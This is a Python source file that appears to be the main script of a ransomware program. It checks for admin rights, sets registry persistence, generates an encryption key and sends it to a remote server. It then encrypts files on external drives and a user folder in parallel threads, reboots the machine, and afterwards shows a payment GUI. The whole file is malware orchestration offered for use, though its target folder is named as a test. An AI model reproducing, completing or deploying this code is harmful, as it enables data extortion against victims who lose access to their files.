# Import :
import os, \
    threading, \
    Crypto_files, \
    Client, \
    Gui, \
    Persistence, \
    List_external_HDD
from cryptography.fernet import Fernet
from ctypes import windll

# Variables
path = os.path.expanduser("~") + "\\Music\\test_ransomware\\"
# Check, if the programm is executed with admin rights
is_admin = windll.shell32.IsUserAnAdmin()
# Check if registry key exists
registry_key_exists = Persistence.check_if_key_exists(is_admin)



if registry_key_exists:
    # Launch the GUI
    Gui.payment_function(path)
else:
    # initialize variables
    i = 1
    main_thread = threading.currentThread()

    # Create the persistence
    Persistence.create_persistence(is_admin)

    # Generate the key
    key = Fernet.generate_key()
    # Sending the key to the remote server
    Client.send_key(key)

    # Return a list of non encrypt files and their path
    list_all_files = List_external_HDD.list_hdd_files() + Crypto_files.list_files(path)

    # Loop through the files
    for non_encrypt_file in list_all_files:
        # Create a thread for each file to accelerate the process
        Thread = Crypto_files.generate_thread(i, key, non_encrypt_file)
        # Call the "run()" method from the "generateThread()" class
        Thread.start()
        i += 1

    # We make sure all threads are finished
    for t in threading.enumerate():
        if t is not main_thread:
            t.join()

    # Rebooting...
    Crypto_files.reboot_machine()







